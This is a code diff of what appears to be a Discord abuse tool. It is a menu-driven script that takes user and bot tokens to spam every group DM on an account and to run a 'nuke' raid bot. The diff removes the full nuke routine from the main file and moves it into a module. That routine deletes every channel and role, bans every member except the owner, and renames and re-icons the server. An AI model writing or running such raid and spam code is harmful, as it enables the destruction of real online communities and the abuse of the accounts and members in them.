@@ -1,7 +1,7 @@
 import os
 import platform
-import traceback
 import sys
+import traceback
 
 from colorama import Fore
 
@@ -15,13 +15,11 @@ import time
 import colorama
 
 # for discord api
-import discord
 import requests
-from discord.ext import commands
 from discord_webhook import DiscordWebhook
 
 # some utils
-from src import utils, cli, api, constants
+from src import utils, cli, api, constants, nuke_bot
 
 colorama.init()
 utils.init()
@@ -86,7 +84,7 @@ def main():
                     headers = {
                         'Authorization': f'{token}',
                         'Content-Type': 'application/json',
-                        'User-Agent': r'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9154 Chrome/124.0.6367.243 Electron/30.1.0 Safari/537.36'
+                        'User-Agent': constants.UA
                     }
 
                     payload = {
@@ -168,16 +166,24 @@ def main():
                             cli.get_return_input()
                         elif choice_page_3 == '4':
                             token = cli.get_input(f"Enter your token")
+
                             groups_ids = api.get_discord_group_dms(token)
-                            api.print_group_dms(groups_ids)
+                            if not type(groups_ids) == int:
+                                api.print_group_dms(groups_ids)
+                            else:
+                                utils.log(f'Failed to fetch, error: {groups_ids}')
                             cli.get_return_input()
                         elif choice_page_3 == '5':
                             token = cli.get_input(f"Enter your token")
                             message = cli.get_input(f"What message to send?")
+
                             groups_dms = api.get_discord_group_dms(token)
-                            for dm in groups_dms:
-                                utils.log(f"Sending message to {dm['id']}")
-                                api.send_message_to_group(token, message, dm['id'])
+                            if not type(groups_dms) == int:
+                                for dm in groups_dms:
+                                    utils.log(f"Sending message to {dm['id']}")
+                                    api.send_message_to_group(token, message, dm['id'])
+                            else:
+                                utils.log(f'Failed to fetch, error: {groups_dms}')
                         elif choice_page_3 == '6':
                             token = cli.get_input(f"Enter your token")
                             message = cli.get_input(f"What message to send?")
@@ -241,7 +247,7 @@ def main():
                                 elif choice_page_4 == '5':
                                     token = cli.get_input(f"Enter your token")
                                     house_id = cli.get_input(f"1 - Bravery\n2 - Brilliance\n3 - Balance\nEnter house_id")
-                                    api.hypesquad(token, house_id)
+                                    api.change_hype_squad(token, house_id)
                                     cli.get_return_input()
                                 elif choice_page_4 == '6':
                                     token = cli.get_input(f"Enter your token")
@@ -264,74 +270,7 @@ def main():
                                         cli.get_return_input()
                                     elif choice_raid == '2':
                                         token = cli.get_input(f"Enter bot token")
-                                        intents = discord.Intents.default()
-                                        intents.members = True
-                                        intents.guilds = True
-                                        intents.message_content = True
-
-                                        bot = commands.Bot(command_prefix='!', intents=intents)
-
-                                        @bot.event
-                                        async def on_ready():
-                                            utils.log(f'Logged in as {bot.user.name}')
-                                            utils.log('Write command "!nuke" in the chat when you ready')
-
-                                        @bot.command()
-                                        @commands.has_permissions(administrator=True)
-                                        async def nuke(ctx):
-                                            guild = ctx.guild
-
-                                            for channel in guild.channels:
-                                                try:
-                                                    await channel.delete()
-                                                    utils.log(f'Deleted channel: {channel.name}')
-                                                except discord.Forbidden:
-                                                    utils.log(f"Permission error when deleting channel {channel.name}.")
-                                                except discord.HTTPException as err:
-                                                    utils.log(
-                                                        f"HTTP exception when deleting channel {channel.name}: {err}")
-
-                                            # Удаление всех ролей
-                                            for role in guild.roles:
-                                                if role.name != '@everyone':
-                                                    try:
-                                                        await role.delete()
-                                                        utils.log(f'Deleted role: {role.name}')
-                                                    except discord.Forbidden:
-                                                        utils.log(f"Permission error when deleting role {role.name}.")
-                                                    except discord.HTTPException as err:
-                                                        utils.log(
-                                                            f"HTTP exception when deleting role {role.name}: {err}")
-
-                                            for member in guild.members:
-                                                if member != guild.owner:
-                                                    try:
-                                                        await member.ban(reason=f"Nuked by {constants.name}")
-                                                        utils.log(f'Banned member: {member.name}')
-                                                    except discord.Forbidden:
-                                                        utils.log(
-                                                            f"Permission error when banning member {member.name}.")
-                                                    except discord.HTTPException as err:
-                                                        utils.log(
-                                                            f"HTTP exception when banning member {member.name}: {err}")
-
-                                            try:
-                                                await guild.edit(name=constants.name)
-                                                utils.log(f'Server name changed to {constants.name}')
-                                            except discord.Forbidden:
-                                                utils.log("Permission error when changing the server name.")
-                                            except discord.HTTPException as err:
-                                                utils.log(f"HTTP exception when changing server name: {err}")
-
-                                            try:
-                                                icon_bytes = await utils.fetch_image_bytes(constants.ICON_URL)
-                                                await guild.edit(icon=icon_bytes)
-                                                utils.log('Server icon updated.')
-                                            except discord.Forbidden:
-                                                utils.log("Permission error when changing the server icon.")
-                                            except discord.HTTPException as err:
-                                                utils.log(f"HTTP exception when changing server icon: {err}")
-
+                                        bot = nuke_bot.bot
                                         bot.run(token)
                                 elif choice_page_4 == '8':
                                     token = cli.get_input(f"Enter your token")
